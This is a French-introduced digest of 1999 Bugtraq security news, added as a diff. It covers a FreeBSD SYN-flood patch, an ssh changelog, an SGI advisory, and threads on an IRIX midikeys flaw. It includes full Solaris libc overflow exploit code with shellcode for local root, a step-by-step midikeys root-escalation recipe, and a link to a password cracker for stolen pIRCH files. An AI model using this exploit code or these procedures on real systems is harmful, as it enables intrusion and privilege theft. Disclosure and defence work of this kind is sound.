@@ -1,0 +1,1862 @@
+Voici une selection que je vous ais faite sur les dernieres news de securite...
+Ces informations proviennent toutes de different newsgroupe anglophone,
+et en particulier bugtraq. 
+
+Bonne lecture ;)))
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+SYN floods against FreeBSD
+###########################
+
+Here's a quickie for the people who have been plagued with high bandwidth
+syn flood attacks, a kernel patch for FreeBSD 3.1-STABLE which rate limits
+SYN processing. Its messy but functional and I don't have time to make it
+better (thats the fbsd developers job, not mine :P), cd /usr/src/sys,
+patch < synlim, add "options SYN_RATELIM" (I highly recommend ICMP_BANDLIM
+as well) to your kernel, recompile, and sysctl net.inet.tcp.synlim will be
+available (default to 100). This is the maximium number of SYNs per second
+that will be processed, the rest will be silently discarded. On my test
+system (P2 450 running 3.1-stable being hit w/15,000 packets per sec),
+this has successfully brought CPU usage from 100% to ~20% (against an open
+port which is replying with unacknowledged ACKs).
+
+Which brings us to the more sticky topic of kernel panics when under SYN
+flood (which I believe to be the cause of some earlier posts from certain
+people at Exodus Communications *cough*). Lord knows I found enough of
+them when doing this testing, but the one that seems to be the biggie for
+crashing when under syn flood is as follows (heh just turned off the
+synlim and panic'd within 8 seconds while writing this):
+
+panic: free: multiple frees
+(kgdb) bt
+#0  boot (howto=256) at ../../kern/kern_shutdown.c:285
+#1  0xc0138c09 in panic (fmt=0xc02192b7 "free: multiple frees")
+    at ../../kern/kern_shutdown.c:446
+#2  0xc0135aaf in free (addr=0xc0cdd600, type=0xc0239330)
+    at ../../kern/kern_malloc.c:333
+#3  0xc01768f4 in ifafree (ifa=0xc0cdd600) at ../../net/route.c:262
+#4  0xc0176876 in rtfree (rt=0xc34ce700) at ../../net/route.c:236
+#5  0xc0176c84 in rtrequest (req=2, dst=0xc34cbac0, gateway=0xc34cbad0,
+    netmask=0x0, flags=393223, ret_nrt=0x0) at ../../net/route.c:536
+#6  0xc017b34d in in_rtqkill (rn=0xc34ce700, rock=0xc0231610)
+    at ../../netinet/in_rmx.c:242
+#7  0xc0176064 in rn_walktree (h=0xc0cd9e00, f=0xc017b2fc <in_rtqkill>,
+    w=0xc0231610) at ../../net/radix.c:956
+#8  0xc017b3ec in in_rtqtimo (rock=0xc0cd9e00) at ../../netinet/in_rmx.c:283
+#9  0xc013d19b in softclock () at ../../kern/kern_timeout.c:124
+
+Which after a quick examination seems to be a perioditic routing table
+cleanup. It seems that in_rtqtimo is scheduled to run every
+net.inet.ip.rtexpire seconds (which is dynamicly adjusted and can never go
+lower then net.inet.ip.rtminexpire). When the system is under heavy load
+from processing lots of small packets (they don't even have to be SYNs,
+anything which can get routed will do the trick, though the packet kiddies
+would get very little gain from just sending an ip header since its going
+to be padded to 64 bytes for the eth frame anyhow), this route cleanup
+code will go wacking at routes it shouldn't and free some memory twice. In
+the course of testing I've gotten my rtq_reallyold to -3 and seen lots of
+"tvotohz: negative time difference -2 sec 0 usec". Perhaps someone with
+free time or more specific knowledge of this area would like to FIX IT? =)
+
+Perhaps when I get more free time I'll test some other *nix's. I would
+really recommend putting all this rate limiting code at an ipfw level.
+
+If you would like to contact me regarding this please use
+humble@quadrunner.com (at least if you want a quick reply), thanks.
+
+--
+Richard Steenbergen <humble@lightning.net> humble@EFNet PGP ID: 0x741D0374
+PGP Key Fingerprint: C6EF EFA0 83B2 071F 1AB6  B879 1F70 4303 741D 0374
+http://users.quadrunner.com/humble
+
+
+
+
+*** conf/options.old    Sat May 15 23:08:03 1999
+--- conf/options        Sat May 15 23:40:21 1999
+***************
+*** 68,73 ****
+--- 68,74 ----
+  SYSVSHM               opt_sysvipc.h
+  UCONSOLE
+  ICMP_BANDLIM
++ SYN_RATELIM
+  
+  # POSIX kernel options
+  P1003_1B      opt_posix.h
+*** netinet/tcp_var.h.old       Sat May 15 23:25:39 1999
+--- netinet/tcp_var.h   Sat May 15 23:45:05 1999
+***************
+*** 40,45 ****
+--- 40,49 ----
+   * Kernel variables for tcp.
+   */
+  
++ #ifdef KERNEL
++ #include "opt_syn_ratelim.h"
++ #endif
++ 
+  /*
+   * Tcp control block, one per tcp; fields:
+   * Organized for 16 byte cacheline efficiency.
+***************
+*** 305,311 ****
+  #define       TCPCTL_RECVSPACE        9       /* receive buffer space */
+  #define       TCPCTL_KEEPINIT         10      /* receive buffer space */
+  #define       TCPCTL_PCBLIST          11      /* list of all outstanding PCBs */
+! #define TCPCTL_MAXID          12
+  
+  #define TCPCTL_NAMES { \
+        { 0, 0 }, \
+--- 309,316 ----
+  #define       TCPCTL_RECVSPACE        9       /* receive buffer space */
+  #define       TCPCTL_KEEPINIT         10      /* receive buffer space */
+  #define       TCPCTL_PCBLIST          11      /* list of all outstanding PCBs */
+! #define TCPCTL_SYNLIM         12      /* Rate limiting of SYNs */
+! #define TCPCTL_MAXID          13
+  
+  #define TCPCTL_NAMES { \
+        { 0, 0 }, \
+***************
+*** 320,325 ****
+--- 325,331 ----
+        { "recvspace", CTLTYPE_INT }, \
+        { "keepinit", CTLTYPE_INT }, \
+        { "pcblist", CTLTYPE_STRUCT }, \
++       { "synlim", CTLTYPE_INT }, \
+  }
+  
+  #ifdef KERNEL
+*** netinet/tcp_input.c.old     Sat May 15 23:08:10 1999
+--- netinet/tcp_input.c         Sun May 16 01:33:51 1999
+***************
+*** 72,77 ****
+--- 72,85 ----
+  static struct tcpiphdr tcp_saveti;
+  #endif
+  
++ #ifdef SYN_RATELIM 
++ static int      synlim = 100;
++ SYSCTL_INT(_net_inet_tcp, TCPCTL_SYNLIM, synlim, CTLFLAG_RW, &synlim, 0, "");
++ #else
++ static int      synlim = -1;
++ SYSCTL_INT(_net_inet_tcp, TCPCTL_SYNLIM, synlim, CTLFLAG_RD, &synlim, 0, "");
++ #endif
++ 
+  static int    tcprexmtthresh = 3;
+  tcp_seq       tcp_iss;
+  tcp_cc        tcp_ccgen;
+***************
+*** 98,104 ****
+            struct tcpiphdr *, struct mbuf *));
+  static int     tcp_reass __P((struct tcpcb *, struct tcpiphdr *, struct mbuf *));
+  static void    tcp_xmit_timer __P((struct tcpcb *, int));
+! 
+  
+  /*
+   * Insert segment ti into reassembly queue of tcp with
+--- 106,112 ----
+            struct tcpiphdr *, struct mbuf *));
+  static int     tcp_reass __P((struct tcpcb *, struct tcpiphdr *, struct mbuf *));
+  static void    tcp_xmit_timer __P((struct tcpcb *, int));
+! static int     syn_ratelim(void);
+  
+  /*
+   * Insert segment ti into reassembly queue of tcp with
+***************
+*** 130,135 ****
+--- 138,183 ----
+        } \
+  }
+  
++ #ifdef SYN_RATELIM
++ int syn_ratelim(void)
++ {
++       static int lticks;
++       static int lpackets;
++       int dticks;
++ 
++       /*
++        * Return ok status if feature disabled or argument out of
++        * ranage.
++        */
++ 
++       if (synlim <= 0)
++               return(0);
++ 
++       dticks = ticks - lticks;
++ 
++       /*
++        * reset stats when cumulative dt exceeds one second.
++        */
++ 
++       if ((unsigned int)dticks > hz) {
++               if (lpackets > synlim)
++                       printf("syn rate limit reached %d/%d pps\n", lpackets, synlim);
++               lticks = ticks;
++               lpackets = 0;
++       }
++ 
++       /*
++        * bump packet count
++        */
++ 
++       if (++lpackets > synlim) {
++               return(-1);
++       }
++ 
++       return(0);
++ }
++ #endif
++ 
+  static int
+  tcp_reass(tp, ti, m)
+        register struct tcpcb *tp;
+***************
+*** 379,384 ****
+--- 427,438 ----
+                ip_fw_fwd_addr = NULL;
+        } else
+  #endif        /* IPFIREWALL_FORWARD */
++ 
++ #ifdef SYN_RATELIM
++       if ((tiflags & TH_SYN) && !(tiflags & TH_ACK))
++               if (syn_ratelim() < 0)
++                       goto drop;
++ #endif
+  
+        inp = in_pcblookup_hash(&tcbinfo, ti->ti_src, ti->ti_sport,
+            ti->ti_dst, ti->ti_dport, 1);
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+SSH :
+######
+
+
+
+
+ssh-1.2.27 is out, here is the changes since 1.2.26:
+
+-cut-
+Thu Apr 29 10:46:21 1999  Timo J. Rinne  <tri@ssh.fi>
+
+        * Replaced OSF1/C2 security support with more complete SIA
+          (Security Integration Architecture).
+
+Mon Feb 22 10:00:12 1999  Timo J. Rinne  <tri@ssh.fi>
+
+        * Added snprintf from ssh2.
+
+        * Tatu's sprintf -> snprintf fixes.
+
+        * Fixed potential buffer overflows.
+
+        * Kerberos authentication disabled, if client is suid-root.
+          This is the only way to avoid security problems that are
+          in Kerberos rather than in ssh.
+
+Wed Nov 25 00:04:11 1998  Tatu Ylonen  <ylo@ssh.fi>
+
+        * sshd.c (sgi_project_setup): patches from Luigi Pugnetti
+          <luigi@symbolic.it>, Eivind Gjelseth <eivind@ii.uib.no>,
+          Randolph J. Herber <herber@fnal.gov>, Sevo Stille <sevo@inm.de>.
+
+        * sshd.c (sgi_project_acct_on): patches from Vern Staats,
+          staatsvr@asc.hpc.mil.
+
+        * sshd.c (login_permitted): Added support for locked accounts on
+          AIX.  Thanks to "Delius, Felix von"
+          <Felix.von-Delius@dresdner-bank.com>.
+
+        * login.c: Improvements for glibc 2.0.100+ from D.A. Harris
+          <rodmur@ecst.csuchico.edu>.
+
+Tue Nov 24 23:27:20 1998  Tatu Ylonen  <ylo@ssh.fi>
+
+        * login.c: Removed assignment to ux.ut_exit.e_{termination,exit},
+          because they are already zeroed and the assignment is causing
+          problems on some platforms.
+
+        * Fixed uninitialized variable err in sgi_project_setup (from
+          Eivind Gjelseth <eivind@ii.uib.no>).
+
+        * ssh-agent.c: Fixed -D (from Ian Goldberg
+<iang@cs.berkeley.edu>).
+
+        * Fixed undefined __udiv_qrnnd bug on Solaris (reported by Karl
+          Berry <karl@suite.deas.harvard.edu>).
+
+        * Fixed a bug in idle timeouts (reported by "David
+          M. Dandarnobody"@nowhere).
+
+        * Fixed deattack.c on Cray (patch from Andreas Schott
+          <schott@rzg.mpg.de>).
+
+        * Fixed x11 forwarding on SunOS 4.1.4 (gethostbyname bug, reported
+          by Bradford Hull <brad@tera.com>.
+
+        * Added snprintf from ssh2.  Changed most sprintfs to snprintf.
+
+        * Fixed a hard-to-exploit security bug in Kerberos code.
+
+        * Added length limitations in manu sprintfs.
+
+Mon Jul 13 16:23:15 1998  Tero Kivinen  <kivinen@ssh.fi>
+
+        * Removed extra ux.ut_syslen setting. Reported by Felix von
+        Leitner <leitner@amdiv.de>.
+
+-cut-
+
+-- Jonas Eriksson
+   Sekure Security Research
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Pirch :
+########
+
+
+
+pIRCH version 32 and 98 save the users NickName password onto disk in 
+c:\pirch32\pirch.ini or c:\pirch98\pirch.ini depending on what version. 
+pIRCH Encrypts the password but i have released a program that can crack
+the 
+password if you supply the .ini you need to get the victims pirch.ini
+file 
+somehow maybe Social Engineering or whatever, then run pIRCHCrack against
+
+it. The user may also use the same password for their ISP, E-mail ETC. 
+
+pIRCHCrack is available at 
+
+http://members.xoom.com/zaiman/pirchcrack.zip 
+
+--Mike 
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Solaris libc exploit
+####################
+
+Hello.
+
+libc overflows when that handles LC_MESSAGES.
+So, If you set the long string to LC_MESSAGES and call
+/bin/sh, the core file is dumped.
+This is serious problem.
+
+The long string that contains the exploit code is set to
+LC_MESSAGES and called suid program by execl(), local user
+can get the root privilege. The called suid program have
+not to contain the overflow bugs.
+I confirmed this bug on Solaris2.6 and Solaris7.
+Solaris2.4, 2.5 does not contain this bug.
+
+The following program is an example to get root privilege.
+This is tested on Solaris2.6 for Sparc edition.
+This program calls "/bin/passwd", but you can also specify
+other  suid programs such as "/bin/su" or "/bin/rsh".
+
+
+/*============================================================
+   ex_lobc.c Overflow Exploits( for Sparc Edition)
+   The Shadow Penguin Security
+   (http://base.oc.to:/skyscraper/byte/551)
+   Written by UNYUN (unewn4th@usa.net)
+  ============================================================
+*/
+#define EV          "LC_MESSAGES="
+#define ADJUST      0
+#define OFFSET      5392
+#define STARTADR    400
+#define NOP         0xa61cc013
+#define RETS        600
+
+char    x[80000];
+
+char exploit_code[] =
+"\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e"
+"\x2b\x0b\xda\xdc\xae\x15\x63\x68"
+"\x90\x0b\x80\x0e\x92\x03\xa0\x0c"
+"\x94\x10\x20\x10\x94\x22\xa0\x10"
+"\x9c\x03\xa0\x14"
+"\xec\x3b\xbf\xec\xc0\x23\xbf\xf4\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
+"\x82\x10\x20\x3b\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01"
+"\x91\xd0\x20\x08"
+;
+
+unsigned long get_sp(void)
+{
+__asm__("mov %sp,%i0 \n");
+}
+
+int i;
+unsigned int ret_adr;
+
+main()
+{
+    putenv("LANG=");
+    memset(x,'x',70000);
+
+    for (i = 0; i < ADJUST; i++) x[i]=0x40;
+    for (i = ADJUST; i < 1000; i+=4){
+        x[i+3]=NOP & 0xff;
+        x[i+2]=(NOP >> 8 ) &0xff;
+        x[i+1]=(NOP >> 16 ) &0xff;
+        x[i+0]=(NOP >> 24 ) &0xff;
+    }
+    for (i=0;i<strlen(exploit_code);i++) x[STARTADR+i+ADJUST]=exploit_code[i];
+    ret_adr=get_sp()-OFFSET;
+    printf("jumping address : %lx\n",ret_adr);
+    if ((ret_adr & 0xff) ==0 ){
+        ret_adr -=16;
+        printf("New jumping address : %lx\n",ret_adr);
+    }
+    for (i = ADJUST+RETS; i < RETS+600; i+=4){
+        x[i+3]=ret_adr & 0xff;
+        x[i+2]=(ret_adr >> 8 ) &0xff;
+        x[i+1]=(ret_adr >> 16 ) &0xff;
+        x[i+0]=(ret_adr >> 24 ) &0xff;
+    }
+    memcpy(x,EV,strlen(EV));
+    x[3000]=0;
+    putenv(x);
+    execl("/bin/passwd","passwd",(char *)0);
+}
+
+
+---
+The Shadow Penguin Security : http://base.oc.to/skyscraper/byte/551
+Webmaster : UNYUN (unewn4th@usa.net)
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+SGI Security Advisory :
+#######################
+
+
+-----BEGIN PGP SIGNED MESSAGE-----
+
+______________________________________________________________________________
+                           SGI Security Advisory
+
+         Title:  IRIX midikeys Vulnerability
+        Number:  19990501-01-A
+          Date:  May 21, 1999
+______________________________________________________________________________
+
+SGI provides this information freely to the SGI user community for its
+consideration, interpretation, implementation and use.   SGI recommends
+that this information be acted upon as soon as possible.
+
+SGI provides the information in this Security Advisory on an "AS-IS" basis
+only, and disclaims all warranties with respect thereto, express, implied
+or otherwise, including, without limitation, any warranty of merchantability
+or fitness for a particular purpose.  In no event shall SGI be liable for
+any loss of profits, loss of business, loss of data or for any indirect,
+special, exemplary, incidental or consequential damages of any kind arising
+from your use of, failure to use or improper use of any of the instructions
+or information in this Security Advisory.
+______________________________________________________________________________
+
+
+SGI acknowledges the publicly reported IRIX midikeys vulnerability and is
+currently investigating.
+
+For the protection of all our customers, SGI does not disclose, discuss
+or confirm vulnerabilities until a full investigation has occurred and
+any necessary patch(es) or release streams are available for all vulnerable
+and supported Unicos and IRIX operating systems.
+
+Until SGI has more definitive information to provide, customers
+are encouraged to assume all security vulnerabilities as exploitable and take
+appropriate steps according to local site security policies and requirements.
+
+Steps to remove setuid on the IRIX midikeys program are found in the
+Temporary Solution section below. No further information is available at
+this time.
+
+As further information becomes available, additional advisories will be
+issued via the normal SGI security information distribution methods
+including the wiretap mailing list.
+
+
+- ----------------------------
+- ----- Temporary Solution ---
+- ----------------------------
+
+The steps below can be used to remove setuid from the IRIX midikeys(1)
+program.
+
+      ================
+      ****  NOTE  ****
+      ================
+
+      Removal of the setuid permission disables functionality that
+      is not implemented or utilized at this time.
+
+     1) Verify midikeys(1) is installed on the system.
+        It is installed by default on IRIX 6.2 and higher.
+        Note that the program size may vary depending on IRIX release.
+
+              % ls -la /usr/sbin/midikeys
+              -rwsr-xr-x 1 root sys  218712 Mar  8 14:57 /usr/sbin/midikeys
+
+     2) Become the root user on the system.
+
+              % /bin/su -
+              Password:
+              #
+
+     3) Change the permissions on the program.
+
+              # /bin/chmod 555 /usr/sbin/midikeys
+
+     4) Verify the new permissions on the program.
+
+              # ls -la /usr/sbin/midikeys
+              -r-xr-xr-x 1 root sys  218712 May  20 13:57 /usr/sbin/midikeys
+
+     4) Return to previous level.
+
+              # exit
+              %
+
+
+- -----------------------------------------
+- --- SGI Security Information/Contacts ---
+- -----------------------------------------
+
+If there are questions about this document, email can be sent to
+cse-security-alert@sgi.com.
+
+                      ------oOo------
+
+SGI provides security information and patches for use by the entire
+SGI community.  This information is freely available to any person
+needing the information and is available via anonymous FTP and the Web.
+
+The primary SGI anonymous FTP site for security information and patches
+is sgigate.sgi.com (204.94.209.1).  Security information and patches
+are located under the directories ~ftp/security and ~ftp/patches,
+respectively. The SGI Security Headquarters Web page is accessible at
+the URL http://www.sgi.com/Support/security/security.html .
+
+For issues with the patches on the FTP sites, email can be sent to
+cse-security-alert@sgi.com.
+
+For assistance obtaining or working with security patches, please
+contact your SGI support provider.
+
+                      ------oOo------
+
+SGI provides a free security mailing list service called wiretap and
+encourages interested parties to self-subscribe to receive (via email) all
+SGI Security Advisories when they are released. Subscribing to the mailing
+list can be done via the Web (http://www.sgi.com/Support/security/wiretap.html)
+or by sending email to SGI as outlined below.
+
+% mail wiretap-request@sgi.com
+subscribe wiretap <YourEmailAddress>
+end
+^d
+
+In the example above, <YourEmailAddress> is the email address that you
+wish the mailing list information sent to.  The word end must be on a
+separate line to indicate the end of the body of the message. The
+control-d (^d) is used to indicate to the mail program that you are
+finished composing the mail message.
+
+
+                      ------oOo------
+
+SGI provides a comprehensive customer World Wide Web site. This site is
+located at http://www.sgi.com/Support/security/security.html .
+
+                      ------oOo------
+
+For reporting *NEW* SGI security issues, email can be sent to
+security-alert@sgi.com or contact your SGI support provider.  A
+support contract is not required for submitting a security report.
+
+______________________________________________________________________________
+    This information is provided freely to all interested parties and
+    may be redistributed provided that it is not altered in any way,
+    SGI is appropriately credited and the document retains and includes
+    its valid PGP signature.
+
+-----BEGIN PGP SIGNATURE-----
+Version: 2.6.2
+
+iQCVAwUBN0XOZ7Q4cFApAP75AQFAXQP/XPq9JyXVm8xiPDjxF327yZ8QAF3u1OF6
+27Z+wIW01G6XKo0Hfu1mPVV0DNQnuKA8NQHST6iQ8F3CnwMI8Ue2RxMMDursQ19Q
+X9FkoIJCHveDWlJwExwR99Gek/rG/pRT4ZizqvaT87ac4yLqK/4IGzo/WUJXxJT1
+zhD9saxG/Z8=
+=QQ8H
+-----END PGP SIGNATURE-----
+
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+IRIX midikeys root exploit :
+############################
+
+Aleph1,
+        Please forgive me if this has already been on this list. I searched
+geek-girl with no luck.  I have been auditing our IRIX boxes and found what I
+believe to be a new vulnerability.
+
+        On IRIX 6.5 systems (IRIX Release 6.5 IP28 )
+        # uname -a
+        IRIX64 devel 6.5 05190004
+
+        The setuid root binary midikeys can be used to read any file on the
+system using its gui interface.  It can also be used to edit anyfile on the
+system.  I was able to get from guest account access to root access using the
+following procedure.
+
+
+        1) Choose an unpassworded account and telnet in. I like guest or lp.
+
+        devel 25% id
+        uid=998 gid=998(guest)
+
+
+        2) Execute the midikeys application with display set to your host.
+
+        devel 26% ./midikeys
+        devel 27% Xlib:  extension "GLX" missing on display "grinch:0.0".
+        Xlib:  extension "GLX" missing on display "grinch:0.0".
+
+
+        3) under the midikeys window click sounds and then midi songs. This will
+        open a file manager type interface.
+
+        4) You can enter the path and filename of files you which to read.
+            including root owned with group/world read/write permissions unset.
+
+        5) If you select a file like "/usr/share/data/music/README" it will
+        appear in a text editor.  Use the text editor to open /etc/passwd and
+        make modifications at will. Save and enjoy.
+
+So I removed the '*' from sysadm...
+
+$ su sysadm
+# id
+uid=0(root) gid=0(sys)
+
+devel 28%  ls -l /usr/sbin/midikeys
+-rwsr-xr-x    1 root     root      218712 Jan 10 17:19 /usr/sbin/midikeys
+
+
+        I have tested this on 2 IRIX 6.5 hosts with success. A patch exists for
+        startmidi and stopmidi buffer overflows.
+
+        More info on previous patch:
+        ftp://sgigate.sgi.com/security/19980301-01-PX).
+
+        However, I didnt find any for midikeys.
+
+
+        -- Larry W. Cashdollar
+           UNIX/Security Operations.
+           Computer Sciences Corporation.
+
+
+
+Larry W. Cashdollar wrote:
+>      Please forgive me if this has already been on this list. I searched
+> geek-girl with no luck.  I have been auditing our IRIX boxes and found what I
+> believe to be a new vulnerability.
+>
+>      On IRIX 6.5 systems (IRIX Release 6.5 IP28 )
+>      # uname -a
+>      IRIX64 devel 6.5 05190004
+>
+>      The setuid root binary midikeys can be used to read any file on the
+> system using its gui interface.  It can also be used to edit anyfile on the
+> system.  I was able to get from guest account access to root access using the
+> following procedure.
+>
+>
+>      1) Choose an unpassworded account and telnet in. I like guest or lp.
+>
+>      devel 25% id
+>      uid=998 gid=998(guest)
+
+Unpassworded account? That's a known (and documented) feature on IRIX
+systems. First thing you do when you unpack an IRIX box: set a root
+password and disable the open accounts (EZsetup, OutOfBox, lp, guest,
+4Dgifts, sgiweb). There's even an entry in the "System manager" to do it.
+
+You just need an account to gain root priviliges; it's not limited to the
+unpassworded accounts, any normal user could use this exploit.
+
+>      2) Execute the midikeys application with display set to your host.
+>
+>      devel 26% ./midikeys
+>      devel 27% Xlib:  extension "GLX" missing on display "grinch:0.0".
+>      Xlib:  extension "GLX" missing on display "grinch:0.0".
+>
+>
+>      3) under the midikeys window click sounds and then midi songs. This will
+>      open a file manager type interface.
+>
+>      4) You can enter the path and filename of files you which to read.
+>          including root owned with group/world read/write permissions unset.
+>
+>      5) If you select a file like "/usr/share/data/music/README" it will
+>      appear in a text editor.  Use the text editor to open /etc/passwd and
+>      make modifications at will. Save and enjoy.
+>
+> So I removed the '*' from sysadm...
+>
+> $ su sysadm
+> # id
+> uid=0(root) gid=0(sys)
+>
+> devel 28%  ls -l /usr/sbin/midikeys
+> -rwsr-xr-x    1 root     root      218712 Jan 10 17:19 /usr/sbin/midikeys
+>
+>
+>      I have tested this on 2 IRIX 6.5 hosts with success. A patch exists for
+>      startmidi and stopmidi buffer overflows.
+
+Verified to work on an O2 running IRIX 6.3:
+  uname -aR
+  IRIX o2 6.3 O2 R10000 12161207 IP32
+
+And on an Octane running IRIX 6.5.3:
+  uname -aR
+  IRIX64 octane 6.5 6.5.3m 01221553 IP30
+
+Editor was XEmacs, but that doesn't really matter.
+
+
+Erik
+(strictly speaking for myself)
+
+--
+J.A.K. (Erik) Mouw, Information and Communication Theory Group, Department
+of Electrical Engineering, Faculty of Information Technology and Systems,
+Delft University of Technology, PO BOX 5031,  2600 GA Delft, The Netherlands
+Phone: +31-15-2785859  Fax: +31-15-2781843  Email J.A.K.Mouw@its.tudelft.nl
+WWW: http://www-ict.its.tudelft.nl/~erik/
+
+
+
+
+
+On May 20, 11:49am, Erik Mouw wrote:
+> Subject: Re: IRIX midikeys root exploit.
+>
+> Verified to work on an O2 running IRIX 6.3:
+>   uname -aR
+>   IRIX o2 6.3 O2 R10000 12161207 IP32
+>
+> And on an Octane running IRIX 6.5.3:
+>   uname -aR
+>   IRIX64 octane 6.5 6.5.3m 01221553 IP30
+>
+> Erik
+> (strictly speaking for myself)
+>
+
+how's the package called, that includes "midikeys"??
+on all boxes (5.3, 6.3, 6.4, 6.5.2) i've checked there is no such program.
+but there is start-/stopmidi.
+
+philipp
+
+--
+   ===============================================================
+   Philipp M. W. Schott
+   Institute for Applied Mathematics    Fon: +49 (0)761/203-5626
+   Hermann-Herder-Str. 10               Fax: +49 (0)761/203-5632
+   Freiburg University                  smtp:  pmws@pmws.de
+   D-79104 Freiburg                     http:   www.pmws.de
+   ===============================================================
+
+
+
+
+
+
+Erik Mouw <J.A.K.Mouw@ITS.TUDELFT.NL> writes:
+
+> >      I have tested this on 2 IRIX 6.5 hosts with success. A patch exists for
+> >      startmidi and stopmidi buffer overflows.
+>
+> Verified to work on an O2 running IRIX 6.3:
+>   uname -aR
+>   IRIX o2 6.3 O2 R10000 12161207 IP32
+>
+> And on an Octane running IRIX 6.5.3:
+>   uname -aR
+>   IRIX64 octane 6.5 6.5.3m 01221553 IP30
+
+Verified to work on an O2 running IRIX 6.5.3.
+
+After a chmod u-s midikeys, midikeys still works, at least after a very
+quick test. Does anybody know why midikeys is setuid root?
+
+Is this reported to SGI?
+
+/torkel
+
+
+
+
+
+
+On May 20,  7:08pm, Philipp Schott wrote:
+>how's the package called, that includes "midikeys"??
+>on all boxes (5.3, 6.3, 6.4, 6.5.2) i've checked there is no such program.
+>but there is start-/stopmidi.
+
+
+   dmedia_eoe.sw.synth
+
+
+~Steve
+
+
+--
+Steven R. Allen - steve.allen@boeing.com   --   SGI Admin Weenie
+http://www.eskimo.com/~wormey/                      ICQ# 6709819
+Contrary to popular belief, Unix is user friendly.
+It just happens to be selective about who it makes friends with.
+
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+IRIX midikeys vulnerability list: 
+#################################
+
+I am attempting to compile a list of vulnerable systems for this exploit.  I
+would like
+to provide as much information to SGI as possible. Here is what I have found so
+far.
+
+Erik Mouw  Email J.A.K.Mouw@its.tudelft.nl   |
+---------------------------------------------|
+Verified to work on an O2 running IRIX 6.3:  |
+  uname -aR
+  IRIX o2 6.3 O2 R10000 12161207 IP32
+
+And on an Octane running IRIX 6.5.3:
+  uname -aR
+  IRIX64 octane 6.5 6.5.3m 01221553 IP30
+
+Larry W. Cashdollar     lwcashd@biw.com       |
+----------------------------------------------|
+Verified on an ONYX/2 running IRIX 6.5.
+  uname -aR
+  IRIX64 onyx 6.5 05190003 IP27
+
+Verified on an Indigo running IRIX 6.5.
+  uname -aR
+  IRIX64 flier 6.5 05190004 IP28
+
+I was unable to test this on our IRIX 6.2 box.
+/usr/sbin/midikeys does exist and it is setuid
+root however.
+
+Anthony C . Zboralski acz@hert.org            |
+----------------------------------------------|
+It works on latest 6.5.4 maintenance release: |
+IRIX ra 6.5 04151556 IP32 mips
+
+
+
+Larry W. Cashdollar
+
+Unix Administrator
+Computer Security Operations
+
+
+
+
+
+This is a summary of some of the responses to this thread. It seems
+that whether or not you use a vi or some other editor makes a difference.
+Would the people that reported it as not working please repeat their
+test using a different editor? Thank you.
+
+
+From Jean-Francois Malouin <Jean-Francois.Malouin@bic.mni.mcgill.ca>:
+
+  dmedia_eoe.sw.synth ( at least on IRIX 6.5.3m).
+
+  Following the aforementionned recipe, I tried to modify some system files
+  on an Octane IP30 running 6.5.3m but to no avail. hmmmm, I see that same
+  system as being reported vulnerable...
+
+  # uname -Ra
+  # IRIX64 6.5 6.5.3m 01221553 IP30
+
+From Jeremy Hinegardner <jeremy@meru.cecs.missouri.edu>:
+
+  I have tested the exploit on a couple of Octanes, and
+  it seems to be fixed in the IRIX 6.5.3 feature stream.
+
+  Our machines using 6.5.3f were not vulnerable.
+  Both the filemanager and the editor ran as the user
+  no root.
+
+  Verified to work on Octane running IRIX 6.4
+  uname -aR
+  IRIX64 octane 6.4 S2MP+OCTANE 02121744 IP30
+
+  Verified to NOT work on Octane running IRIX 6.5.3f
+  uname -aR
+  IRIX64 octane 6.5 6.5.3f 01221643 IP30
+
+  The IRIX 6.5.4 streams is available for download,
+  anyone try them?
+
+From J.A. Gutierrez <spd@gtc1.cps.unizar.es>:
+
+    * verified:
+
+    IRIX64 IRIX 6.5.3f
+    (editor (jot) runs as root)
+     |-+------- 1147467 root     midikeys
+     | \-+----- 1150492 root     dirview /usr/share/data/music
+     |   \----- 1152654 root     fmserv sgonyx.ita.es:1.0
+
+
+    * Didn't work at first
+
+    IRIX 6.2 where midikeys is from dmedia_eoe.sw.synth
+    (editor (vi) runs as user)
+
+    But if you open an X11 editor (gvim), it will run as root,
+    and you will be able to edit anything, again...
+
+From eLement <eLement@nirvanet.net>:
+
+  The vulnerability is verified to work on
+
+  uname -aR
+  IRIX eLement 6.3 O2 R10000 12161207 IP32
+
+From Klaus <klaus@imprint.uwaterloo.ca>
+
+  The machine on my desk:
+
+  IRIX grimlock 6.5 6.5.2m 11051733 IP32
+
+  didn't seem to be vulnerable, but I don't have nedit installed; vi didn't
+  preserve my setuid from midikeys.
+
+  However, on a machine -with- nedit,
+
+  IRIX jazz 6.5 6.5.2m 11051733 IP32
+
+  I was able to replicate it. I was also able to replicate the exploit using
+  jot (another window based text editor).
+
+  So the exploit seems to revolve around the use of an editor that doesn't
+  require a terminal device; opening a tty to run the editor (although I'm
+  not 100% on how gvim works in that respect) seems to reset the effective
+  UID.
+
+
+--
+Aleph One / aleph1@underground.org
+http://underground.org/
+KeyID 1024/948FD6B5
+Fingerprint EE C9 E8 AA CB AF 09 61  8C 39 EA 47 A8 6A B8 01
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Pine 4.xx exploit :
+###################
+
+Hi ...
+I wrote exploit on Pine 4.xx , but perhaps it doesn't work well on some
+computer ... - you must use gdb and practice on non-root user ...
